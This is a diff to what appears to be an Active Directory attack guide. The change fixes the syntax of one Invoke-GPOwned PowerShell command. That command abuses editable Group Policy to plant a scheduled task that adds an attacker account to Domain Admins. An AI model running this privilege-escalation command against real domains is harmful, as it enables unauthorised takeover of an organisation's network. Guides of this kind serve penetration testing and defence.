@@ -82,7 +82,7 @@ An attacker can edit the GPO to add a two-stage scheduled task that escalates to
 Using [Invoke-GPOwned](https://github.com/n0troot/Invoke-GPOwned):
 
 ```powershell
-Invoke-GPOwned -GPOName "Target_GPO_Name"  -LoadDLL ".\Microsoft.ActiveDirectory.Management.dll" -User "Attacker" -DA -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -SecondTaskXMLPath ".\wsadd.xml" -Author "DA_User" -SecondXMLCMD "/r net group 'Domain Admins' <Attacker> /add /dom"
+Invoke-GPOwned -GPOName "Target_GPO_Name"  -LoadDLL ".\Microsoft.ActiveDirectory.Management.dll" -User "Attacker" -DA -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -SecondTaskXMLPath ".\wsadd.xml" -Author "DA_User" -SecondXMLCMD "/r net group 'Domain Admins' <Attacker> /add /domain"
 ```
 
 ### Force Group Policy update
